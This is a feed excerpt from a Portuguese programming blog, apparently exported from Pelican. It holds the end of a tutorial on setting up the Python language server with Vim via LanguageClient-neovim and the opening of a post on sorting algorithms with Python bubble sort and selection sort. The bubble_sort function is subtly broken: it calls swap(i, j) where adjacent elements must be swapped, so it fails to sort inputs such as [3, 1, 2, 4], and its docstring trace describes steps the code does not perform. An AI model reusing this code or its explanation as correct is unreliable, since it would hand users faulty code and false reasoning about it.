  &lt;a href="https://github.com/PyCQA/pyflakes" title="Checks Python source files for errors"&gt;&lt;em&gt;Pyflakes&lt;/em&gt;&lt;/a&gt;, &lt;a href="https://github.com/pycqa/pycodestyle" title="Python style checker"&gt;&lt;em&gt;pycodestyle&lt;/em&gt;&lt;/a&gt;
  e &lt;a href="https://github.com/PyCQA/pydocstyle" title="Docstring style checker"&gt;&lt;em&gt;pydocstyle&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;Formatting&lt;/em&gt; é resolvido via &lt;a href="https://github.com/hhatto/autopep8" title="Formats Python code to PEP 8"&gt;&lt;em&gt;autopep8&lt;/em&gt;&lt;/a&gt;
  e &lt;a href="https://github.com/google/yapf" title="A formatter for Python files"&gt;&lt;em&gt;YAPF&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Há um certo grau de customização, como por exemplo usar o &lt;a href="https://klauslaube.com.br/2019/02/07/deixe-darem-pitaco-no-seu-codigo-com-black.html" title="Leia mais sobre Black"&gt;&lt;em&gt;Black&lt;/em&gt;&lt;/a&gt; ao invés de &lt;em&gt;YAPF&lt;/em&gt;. Discutiremos
mais sobre esse tópico a seguir.&lt;/p&gt;
&lt;h2&gt;Clientes LSP&lt;/h2&gt;
&lt;p&gt;Segundo o &lt;em&gt;langserver.org&lt;/em&gt;, os principais &lt;em&gt;IDEs&lt;/em&gt; e editores já possuem alguma forma de cliente implementado. Seja através de extensões (como &lt;em&gt;JetBrains IDE&lt;/em&gt;, &lt;a href="https://klauslaube.com.br/tag/vim.html" title="Leia mais sobre Vim"&gt;&lt;em&gt;Vim&lt;/em&gt;&lt;/a&gt;,
&lt;em&gt;Sublime&lt;/em&gt;, &lt;em&gt;Atom&lt;/em&gt; e &lt;em&gt;Emacs&lt;/em&gt;), ou através de suporte &lt;em&gt;built-in&lt;/em&gt; (como &lt;em&gt;VS Code&lt;/em&gt; e &lt;em&gt;Oni&lt;/em&gt;).&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/lsp-one-ring.jpeg" width="740" height="493" title="Sauron faz um anel para juntar a todos. Sem querer comparar Microsoft com Sauron, mas espero que isso não acabe em uma guerra (lego-lord-of-the-rings.wikia.com)" alt="Sauron faz um anel para juntar a todos. Sem querer comparar Microsoft com Sauron, mas espero que isso não acabe em uma guerra (lego-lord-of-the-rings.wikia.com)"&gt;&lt;/p&gt;
&lt;p&gt;Para &lt;em&gt;Vim&lt;/em&gt;, uma opção que tenho usado com sucesso é o &lt;a href="https://github.com/autozimu/LanguageClient-neovim" title="Repositório oficial do projeto"&gt;&lt;em&gt;LanguageClient-neovim&lt;/em&gt;&lt;/a&gt;, que embora possa parecer
exclusivo para o &lt;em&gt;Neovim&lt;/em&gt;, possui suporte para &lt;em&gt;Vim 8.x&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Na prática&lt;/h2&gt;
&lt;h3&gt;Configurando o servidor&lt;/h3&gt;
&lt;p&gt;Vamos para um exemplo prático de como usar &lt;em&gt;LSP&lt;/em&gt; e &lt;em&gt;Vim&lt;/em&gt; com &lt;em&gt;Python&lt;/em&gt;. Mas antes, deixa eu definir algumas &lt;em&gt;constraints&lt;/em&gt; do meu ambiente de desenvolvimento:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Quero utilizar &lt;em&gt;flake8&lt;/em&gt; ao invés de &lt;em&gt;pycodestyle&lt;/em&gt;;&lt;/li&gt;
&lt;li&gt;Quero utilizar &lt;em&gt;Black&lt;/em&gt; ao invés de &lt;em&gt;YAPF&lt;/em&gt; ou &lt;em&gt;autopep8&lt;/em&gt;;&lt;/li&gt;
&lt;li&gt;Quero utilizar &lt;em&gt;isort&lt;/em&gt; como uma das opções de formatação.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Para começar, vamos instalar o &lt;em&gt;language server&lt;/em&gt;. Eu prefiro tê-lo dentro do &lt;a href="https://klauslaube.com.br/tag/virtualenv.html" title="Leia mais sobre Virtualenv"&gt;ambiente virtual&lt;/a&gt; do projeto em que estou trabalhando. É trabalhoso
e repetitivo se você estiver trabalhando em diferentes projetos e &lt;em&gt;virtualenvs&lt;/em&gt;!
Uma alternativa mais prática é tê-lo instalado em uma instância global do &lt;a href="https://klauslaube.com.br/2016/04/26/o-simples-e-poderoso-pyenv.html" title="O simples e poderoso Pyenv"&gt;&lt;em&gt;pyenv&lt;/em&gt;&lt;/a&gt;. Fica a seu critério o destino
da instalação:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pip install python-language-server
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;O próprio servidor identificará quais ferramentas você tem instaladas e habilitará determinada capacidade proporcionada por tal ferramenta (por exemplo, se o &lt;em&gt;Rope&lt;/em&gt; estiver instalado,
será capaz de fazer &lt;em&gt;renaming&lt;/em&gt;). Mas dentre elas o &lt;em&gt;Jedi&lt;/em&gt; é fundamental, e por isso é instalada automaticamente como dependência do &lt;em&gt;PyLS&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Nesse momento temos grande parte das funcionalidades cobertas pelo &lt;em&gt;LSP&lt;/em&gt; habilitadas pelo servidor. Uma muito útil, que ainda está faltando, é o &lt;em&gt;renaming&lt;/em&gt;. Segundo a lista acima, conseguimos
tal capacidade ao instalar o &lt;em&gt;Rope&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pip install &amp;#39;python-language-server[rope]&amp;#39;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Se você está interessado em utilizar a configuração padrão do &lt;em&gt;python-language-server&lt;/em&gt;, uma opção mais prática é instalar todos os &lt;em&gt;providers&lt;/em&gt; de uma só vez:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pip install &amp;#39;python-language-server[all]&amp;#39;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para fins didáticos estamos resolvendo as dependências manualmente. Há uma outra forma de gerenciar quais &lt;em&gt;providers&lt;/em&gt; serão utilizados, que discutiremos a seguir.&lt;/p&gt;
&lt;p&gt;Para termos o &lt;em&gt;isort&lt;/em&gt; e o &lt;em&gt;Black&lt;/em&gt; habilitados como ferramentas de formatação, precisaremos recorrer à &lt;em&gt;plugins&lt;/em&gt; de terceiros:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pip install pyls-isort pyls-black
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Infelizmente, o &lt;code&gt;pyls-black&lt;/code&gt; exige que você não tenha o &lt;code&gt;autopep8&lt;/code&gt; instalado para funcionar. Como não há um controle manual para decidir qual será usado,
a melhor forma é garantindo que apenas uma das duas extensões esteja instalada.&lt;/p&gt;
&lt;p&gt;Temos tudo o que é necessário para o lado do servidor.&lt;/p&gt;
&lt;h3&gt;Configurando o cliente&lt;/h3&gt;
&lt;p&gt;A melhor forma de instalarmos o &lt;em&gt;LanguageClient-neovim&lt;/em&gt; é através do utilitário &lt;code&gt;Plug&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c"&gt;&amp;quot; ~/.vimrc&lt;/span&gt;

Plug &lt;span class="s1"&gt;&amp;#39;autozimu/LanguageClient-neovim&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; {
    \ &lt;span class="s1"&gt;&amp;#39;branch&amp;#39;&lt;/span&gt;: &lt;span class="s1"&gt;&amp;#39;next&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    \ &lt;span class="s1"&gt;&amp;#39;do&amp;#39;&lt;/span&gt;: &lt;span class="s1"&gt;&amp;#39;bash install.sh&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    \ }

Plug &lt;span class="s1"&gt;&amp;#39;junegunn/fzf&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ele funciona muito bem com o &lt;a href="https://github.com/junegunn/fzf.vim" title="Veja o repositório oficial do projeto"&gt;&lt;em&gt;fzf&lt;/em&gt;&lt;/a&gt;, portanto, é uma boa pedida termos os dois disponíveis.&lt;/p&gt;
&lt;p&gt;O próximo passo é informar ao cliente como encontrar o servidor da linguagem:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c"&gt;&amp;quot; ~/.vimrc&lt;/span&gt;

&lt;span class="p"&gt;(&lt;/span&gt;...&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="k"&gt;g&lt;/span&gt;:LanguageClient_serverCommands &lt;span class="p"&gt;=&lt;/span&gt; {
    \ &lt;span class="s1"&gt;&amp;#39;python&amp;#39;&lt;/span&gt;: [&lt;span class="s1"&gt;&amp;#39;pyls&amp;#39;&lt;/span&gt;]&lt;span class="p"&gt;,&lt;/span&gt;
    \ }
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ainda precisamos dizer ao &lt;em&gt;LSP&lt;/em&gt; sobre as nossas preferências. O arquivo abaixo está situado na raíz do projeto que estou trabalhando,
mais especificamente em &lt;code&gt;./.vim/settings.json&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;pyls&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;configurationSources&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;flake8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;plugins&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="nt"&gt;&amp;quot;yapf&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;quot;enabled&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;
      &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para fins didáticos adicionei o &lt;code&gt;yapf&lt;/code&gt; à configuração. Alguns &lt;em&gt;plugins&lt;/em&gt; possuem a flexibilidade de mesmo que instalados, poderem ser desabilitados.&lt;/p&gt;
&lt;p&gt;Pronto! O cliente está configurado, e com os seguintes comandos você pode explorar todas as funcionalidades do &lt;em&gt;LSP&lt;/em&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Ctrl+x Ctrl+o&lt;/code&gt;: &lt;em&gt;Auto completion&lt;/em&gt; via &lt;em&gt;Omni completion&lt;/em&gt; (o &lt;a href="https://github.com/Shougo/deoplete.nvim" title="Dark powered asynchronous completion framework for neovim/Vim8"&gt;&lt;em&gt;Deoplete&lt;/em&gt;&lt;/a&gt; é uma boa pedida)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;:call LanguageClient#textDocument_definition()&lt;/code&gt;: &lt;em&gt;Go to definition&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;:call LanguageClient#textDocument_hover()&lt;/code&gt;: &lt;em&gt;Hover&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;:call LanguageClient#textDocument_references()&lt;/code&gt;: &lt;em&gt;References&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;:call LanguageClient#textDocument_documentSymbol()&lt;/code&gt;: Lista de &lt;em&gt;Symbols&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;:call LanguageClient#textDocument_rename()&lt;/code&gt;: &lt;em&gt;Renaming&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;:call LanguageClient#textDocument_formatting()&lt;/code&gt;: &lt;em&gt;Formatting&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;:call :call LanguageClient_contextMenu()&lt;/code&gt;: Menu de contexto mostrando todas as opções disponíveis&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/vim-lsp-autocomplete.png" width="640" height="370" title="Exemplo do LSP funcionando com o Vim" alt="Exemplo do LSP funcionando com o Vim"&gt;&lt;/p&gt;
&lt;p&gt;Agora é só configurar os &lt;em&gt;key bindings&lt;/em&gt; e correr para o abraço :)&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.kieranbamforth.me/blog/vim-lsp.html"&gt;kieranbamforth.me - Vim + Language Server Protocol—in 2019&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://langserver.org/"&gt;Langserver.org - A community-driven source of knowledge&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://microsoft.github.io/language-server-protocol/"&gt;Language Server Protocol official page&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.thisisvini.com/vim-better-go-to-definition-completion/"&gt;This is Vini - Vim: Better "Go to definition" and completion using ALE&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/JSON-RPC"&gt;Wikipedia - JSON-RPC&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="web"></category><category term="editores"></category><category term="ide"></category><category term="vscode"></category><category term="vim"></category><category term="python"></category><category term="pyls"></category><category term="lsp"></category></entry><entry><title>Algoritmos de ordenação - Parte 1</title><link href="https://klauslaube.com.br/2019/05/10/algoritmos-de-ordenacao-parte-1.html" rel="alternate"></link><published>2019-05-10T10:45:00-03:00</published><updated>2019-05-10T10:45:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2019-05-10:/2019/05/10/algoritmos-de-ordenacao-parte-1.html</id><summary type="html">&lt;p&gt;Voltamos a falar sobre &lt;a href="https://klauslaube.com.br/tag/algoritmos.html" title="Leia mais sobre Algoritmos"&gt;algoritmos&lt;/a&gt;, e
dessa vez o tópico é sobre ordenação de elementos. As linguagens de programação abstraem
toda a complexidade envolvida para nós, mas mais que fundamental, compreender como tais algoritmos funcionam é mais um passo
adiante no aprendizado das Ciências da Computação.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;h2&gt;Definição&lt;/h2&gt;
&lt;p&gt;Algoritmos de ordenação …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Voltamos a falar sobre &lt;a href="https://klauslaube.com.br/tag/algoritmos.html" title="Leia mais sobre Algoritmos"&gt;algoritmos&lt;/a&gt;, e
dessa vez o tópico é sobre ordenação de elementos. As linguagens de programação abstraem
toda a complexidade envolvida para nós, mas mais que fundamental, compreender como tais algoritmos funcionam é mais um passo
adiante no aprendizado das Ciências da Computação.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;h2&gt;Definição&lt;/h2&gt;
&lt;p&gt;Algoritmos de ordenação (ou &lt;em&gt;Sorting Algorithms&lt;/em&gt;) podem ser &lt;a href="https://brilliant.org/wiki/sorting-algorithms/" title="Sorting Algorithms no Brilliant"&gt;definidos como&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;(...) an algorithm made up of a series of instructions that takes an array as input, performs specified operations on the array, sometimes called a list, and outputs a sorted array. (...) There are many factors to consider when choosing a sorting algorithm to use.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Resumidamente, é o tipo de algoritmo que tem por entrada um &lt;em&gt;array&lt;/em&gt; e organiza os seus items seguindo uma ordem. Um fator a se considerar é que, as dimensões do &lt;em&gt;array&lt;/em&gt;, e as limitações de espaço, podem influenciar na escolha do algoritmo que será utilizado.&lt;/p&gt;
&lt;h2&gt;Bubble sort&lt;/h2&gt;
&lt;p&gt;O &lt;em&gt;Bubble sort&lt;/em&gt; é a escolha mais comum quando começamos a estudar sobre algoritmos e ordenação, por sua simplicidade e por dar uma ideia geral sobre como funcionam tais algoritmos.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/algoritmos-bubble-sort.gif" width="300" height="180" title="Passos do Bubble sort (wikipedia.org)" alt="Passos do Bubble sort (wikipedia.org)"&gt;&lt;/p&gt;
&lt;p&gt;Os passos são os seguintes:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Compare &lt;code&gt;A[0]&lt;/code&gt; e &lt;code&gt;A[1]&lt;/code&gt;. Se &lt;code&gt;A[0]&lt;/code&gt; for maior que &lt;code&gt;A[1]&lt;/code&gt;, troque os elementos;&lt;/li&gt;
&lt;li&gt;Vá para &lt;code&gt;A[1]&lt;/code&gt;. Se &lt;code&gt;A[1]&lt;/code&gt; for maior que &lt;code&gt;A[2]&lt;/code&gt;, troque os elementos; Repita o processo para cada par de elementos até o final do &lt;em&gt;array&lt;/em&gt;;&lt;/li&gt;
&lt;li&gt;Repita os passos &lt;code&gt;1&lt;/code&gt; e &lt;code&gt;2&lt;/code&gt; &lt;code&gt;n&lt;/code&gt; vezes.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;E é daí que vem seu nome: Pegue o valor mais alto, e "bubble it up" até o fim do &lt;em&gt;array&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Abaixo o algoritmo representado em código &lt;em&gt;Python&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;bubble_sort&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="sd"&gt;    Teste de mesa&lt;/span&gt;
&lt;span class="sd"&gt;    -------------&lt;/span&gt;

&lt;span class="sd"&gt;    array = []:&lt;/span&gt;
&lt;span class="sd"&gt;        - `i` é `-1`, não cai no laço `while` e retorna array sem modificações&lt;/span&gt;

&lt;span class="sd"&gt;    array = [1]:&lt;/span&gt;
&lt;span class="sd"&gt;        - `i` é `0`, não cai no laço `while` e retorna array sem modificações&lt;/span&gt;

&lt;span class="sd"&gt;    array = [1, 2]:&lt;/span&gt;
&lt;span class="sd"&gt;        - `i` é `1`, entra no laço `while`&lt;/span&gt;
&lt;span class="sd"&gt;        - `range(1)` resulta em `[0]`&lt;/span&gt;
&lt;span class="sd"&gt;        - `j` é `0`. `j[0]` é menor que `j[1]`. Não faz swap&lt;/span&gt;
&lt;span class="sd"&gt;        - Sai do laço `for`&lt;/span&gt;
&lt;span class="sd"&gt;        - `i` é `0`. Sai do laço `while`&lt;/span&gt;
&lt;span class="sd"&gt;        - Retorna array sem modificações&lt;/span&gt;

&lt;span class="sd"&gt;    array = [3, 1, 2, 4]:&lt;/span&gt;
&lt;span class="sd"&gt;        - `i` é `3`, entra no laço `while`&lt;/span&gt;
&lt;span class="sd"&gt;        - `range(3)` resulta em `[0, 1, 2]`&lt;/span&gt;
&lt;span class="sd"&gt;        - `j` é `0`. `j[0]` é maior que `j[1]`. Faz swap&lt;/span&gt;
&lt;span class="sd"&gt;        - `array` fica [1, 3, 2, 4]&lt;/span&gt;
&lt;span class="sd"&gt;        - `j` é `1`. `j[1]` é maior que `j[2]`. Faz swap&lt;/span&gt;
&lt;span class="sd"&gt;        - `array` fica [1, 2, 3, 4]&lt;/span&gt;
&lt;span class="sd"&gt;        - `j` é `2`. `j[2]` é menor que `j[3]`. Não faz swap&lt;/span&gt;
&lt;span class="sd"&gt;        - Sai do laço `for`&lt;/span&gt;
&lt;span class="sd"&gt;        - `i` é `2`, entra no laço `for [0, 1]`. Itens estão ordenados. Não faz swap&lt;/span&gt;
&lt;span class="sd"&gt;        - Sai do laço `for`&lt;/span&gt;
&lt;span class="sd"&gt;        - `i` é `1`, entra no laço `for [0]`. Itens estão ordenados. Não faz swap&lt;/span&gt;
&lt;span class="sd"&gt;        - `i` é `0`. Sai do laço `while`&lt;/span&gt;
&lt;span class="sd"&gt;        - Retorna array ordenado&lt;/span&gt;
&lt;span class="sd"&gt;    &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;swap&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;

    &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt;
                &lt;span class="n"&gt;swap&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;-=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;

    &lt;span class="c1"&gt;# Ao alterar o array in-place, não há reais motivos para retorná-lo&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;array&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Running-time complexity&lt;/em&gt;: Para cada elemento do &lt;em&gt;array&lt;/em&gt;, o algoritmo faz &lt;code&gt;n - 1&lt;/code&gt; comparações. Considerando que ele percorre todo o array fazendo &lt;code&gt;n - 1&lt;/code&gt; comparações, em &lt;a href="https://klauslaube.com.br/2018/11/09/analise-assintotica.html" title="Análise assintótica"&gt;&lt;em&gt;big O notation&lt;/em&gt;&lt;/a&gt; temos &lt;code&gt;O(n^2)&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;em&gt;Space complexity&lt;/em&gt;: Como operamos a troca de elementos (&lt;code&gt;swap&lt;/code&gt;), não precisamos de nenhuma outra estrutura de dados para armazenar o resultado da operação, com isso, temos complexidade de espaço de &lt;code&gt;O(1)&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Selection sort&lt;/h2&gt;
&lt;p&gt;Outro algoritmo simples e intuitivo, e &lt;a href="https://www.quora.com/Which-is-faster-selection-sort-or-bubble-sort" title="Which is faster: selection sort or bubble sort?"&gt;ligeiramente mais performático&lt;/a&gt;, é o &lt;em&gt;Selection sort&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/algoritmos-selection-sort.gif" width="100" height="371" title="Passos do Selection Sort (wikipedia.org)" alt="Passos do Selection Sort (wikipedia.org)"&gt;&lt;/p&gt;
&lt;p&gt;Os passos podem ser resumidos em:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Encontre o menor valor;&lt;/li&gt;
&lt;li&gt;Troque o menor valor com o primeiro item do &lt;em&gt;array&lt;/em&gt;;&lt;/li&gt;
&lt;li&gt;Encontre o segundo menor valor;&lt;/li&gt;
&lt;li&gt;Troque o segundo menor valor com o segundo item do &lt;em&gt;array&lt;/em&gt;;&lt;/li&gt;
&lt;li&gt;Repita a operação até o &lt;em&gt;array&lt;/em&gt; estar ordenado.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/mad-max-ordem.jpeg" width="740" height="416" title="Um mundo sem ordem é um mundo infeliz (tasteofcinema.com)" alt="Um mundo sem ordem é um mundo infeliz (tasteofcinema.com)"&gt;&lt;/p&gt;
&lt;p&gt;No algoritmo anterior tínhamos como finalidade mover o maior valor para o final do &lt;em&gt;array&lt;/em&gt;. Nesse, a finalidade é selecionar o valor mais baixo no &lt;em&gt;array&lt;/em&gt;, e movê-lo para o começo da estrutura.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;selection_sort&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="sd"&gt;    Teste de mesa&lt;/span&gt;
&lt;span class="sd"&gt;    -------------&lt;/span&gt;

&lt;span class="sd"&gt;    array = []:&lt;/span&gt;
&lt;span class="sd"&gt;        - `len(array)` é `0`, não cai no primeiro no laço `for` e retorna array sem modificações&lt;/span&gt;

&lt;span class="sd"&gt;    array = [1]:&lt;/span&gt;
&lt;span class="sd"&gt;        - `len(array)` é `1`, entra no primeiro laço `for`&lt;/span&gt;
&lt;span class="sd"&gt;        - `min_index` é `0`, não entra no segundo laço&lt;/span&gt;
&lt;span class="sd"&gt;        - Retorna array sem modificações&lt;/span&gt;

&lt;span class="sd"&gt;    array = [1, 2]:&lt;/span&gt;
&lt;span class="sd"&gt;        - `len(array)` é `2`, entra no primeiro laço `for`&lt;/span&gt;
&lt;span class="sd"&gt;        - `i` é `0` e `min_index` é `0`. Entra no segundo laço `for`&lt;/span&gt;
&lt;span class="sd"&gt;        - `j` é `1`. `array[0]` não é maior que `array[1]`&lt;/span&gt;
&lt;span class="sd"&gt;        - Sai do segundo laço `for`&lt;/span&gt;
&lt;span class="sd"&gt;        - Faz swap `0` (`i`) e `0` (`min_index`)&lt;/span&gt;
&lt;span class="sd"&gt;        - Retorna array sem modificações&lt;/span&gt;

&lt;span class="sd"&gt;    array = [3, 1, 2, 4]:&lt;/span&gt;
&lt;span class="sd"&gt;        - `len(array)` é `4`, entra no primeiro laço `for`&lt;/span&gt;
&lt;span class="sd"&gt;        - `i` é `0` e `min_index` é `0`. Entra no segundo laço `for`&lt;/span&gt;
&lt;span class="sd"&gt;        - `j` é `1`. `array[0]` é maior que `array[1]`&lt;/span&gt;
&lt;span class="sd"&gt;        - `min_index` é `1`&lt;/span&gt;
&lt;span class="sd"&gt;        - `j` é `2`. `array[1]` não é maior que `array[2]`&lt;/span&gt;
&lt;span class="sd"&gt;        - `j` é `3`. `array[1]` não é maior que `array[3]`&lt;/span&gt;
&lt;span class="sd"&gt;        - Sai do segundo laço `for`&lt;/span&gt;
